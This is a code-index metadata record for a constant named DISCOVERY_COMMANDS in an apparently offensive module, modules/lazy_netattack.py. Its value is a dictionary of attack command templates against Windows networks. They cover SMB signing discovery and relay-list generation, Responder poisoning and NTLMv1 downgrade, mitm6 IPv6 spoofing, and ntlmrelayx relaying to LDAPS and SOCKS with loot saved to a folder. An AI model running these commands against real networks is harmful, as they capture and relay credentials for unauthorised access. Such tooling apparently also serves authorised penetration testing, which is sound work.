{"uid":"modules/lazy_netattack.py::DISCOVERY_COMMANDS","name":"DISCOVERY_COMMANDS","qualname":"DISCOVERY_COMMANDS","kind":"constant","file":"modules/lazy_netattack.py","line":65,"end_line":84,"language":"py","signature":"DISCOVERY_COMMANDS: dict[str, tuple[str, ...]]","params":[],"returns":"dict[str, tuple[str, ...]]","decorators":[],"bases":[],"modifiers":[],"visibility":"public","doc":{"summary":"","description":"","params":[],"returns":null,"yields":null,"raises":[],"attributes":[],"examples":[],"notes":[],"see_also":[],"deprecated":"","since":"","style":"plain"},"parent":"modules/lazy_netattack.py","members":[],"inferred_raises":[],"returns_value":null,"value":"{'smb_signing': ('nmap -T4 -p {smb_port} --script smb-security-mode {target}', 'nxc smb {target} --gen-relay-list {relay_list}'), 'llmnr_probe': ('responder -I {lhost_if} -A  # passive analysis only, no spoofing',), 'mitm6_recon': ('nmap -6 -T4 -p {ldap_port} {target}', 'mitm6 -d {domain} -i {lhost_if}  # operator-facing listener', 'impacket-ntlmrelayx --ipv6 -wh wpad -t ldaps://{dc} -smb2support -l sessions/loot'), 'relay': ('sudo responder -I {lhost_if}  # turn SMB/HTTP servers Off in Responder.conf for relay', 'impacket-ntlmrelayx -tf {relay_list} -smb2support -socks -dh'), 'ntlmv1_downgrade': ('responder -I {lhost_if} --lm --disable-ess', 'reg.exe query HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\Lsa /v LmCompatibilityLevel')}","base_uids":[],"subclasses":[],"calls":[],"called_by":[]}
